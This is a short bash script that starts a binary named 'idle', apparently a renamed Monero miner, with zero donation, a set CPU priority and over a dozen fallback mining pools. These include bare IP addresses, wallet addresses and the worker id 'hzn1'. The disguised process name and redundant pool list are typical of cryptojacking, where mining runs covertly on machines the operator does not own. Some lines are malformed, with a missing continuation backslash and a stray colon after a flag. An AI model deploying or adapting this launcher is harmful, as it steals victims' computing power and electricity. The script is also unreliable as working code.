#!/bin/bash

./idle --donate-level 0  --cpu-priority 4 \
 -o 95.217.134.205:3333 --rig-id hzn1 \
 -o stratum+tcp://rx-eu.unmineable.com:3333 -a rx -u "DOGE:DPyjfCy8KjJCdfAfoWV381rhVde4piKeBR.hzn1#buno-blux" -p x -k \
 -o 95.179.241.203:80 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hzn1 --tls --tls-fingerprint: "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14" \
 -o xmr.2miners.com:2222 --coin XMR -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ.hzn1" -p x -k \
 -o xmr.ss.dxpool.com:5555 --coin XMR -u "gamesup.hzn1" -p x -k \
 -o xmr.pool.gntl.co.uk:20009 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hzn1 -k --tls \
 -o pool.hashvault.pro:443 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hzn1 -k --tls \
 -o de.monero.herominers.com:1111 -a rx/0 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hzn1 -k \
 -o monero.herominers.com:10191 -a rx/0 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hzn1 -k --tls \
 -o xmr.kryptex.network:7777 --coin XMR -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ/hzn1" -k \
 -o monerohash.com:5555 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p x -k \
 -o monerohash.com:9999 --coin XMR -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -k --tls \
 -o xmr-eu1.nanopool.org:14433 --coin XMR -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hzn1 -k --tls \
 -o randomxmonero.eu.nicehash.com:3380 -a randomx --coin monero -u "NHbRWTzTj2XXvhDLnCTV86V3t6G9g1megdvQ.hzn1" -k
 -o pool.supportxmr.com:443 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hzn1 -k --tls \
 -o pool.xmr.pt:9000 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -k --tls \
 -o xmrpool.eu:9999 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -k --tls \
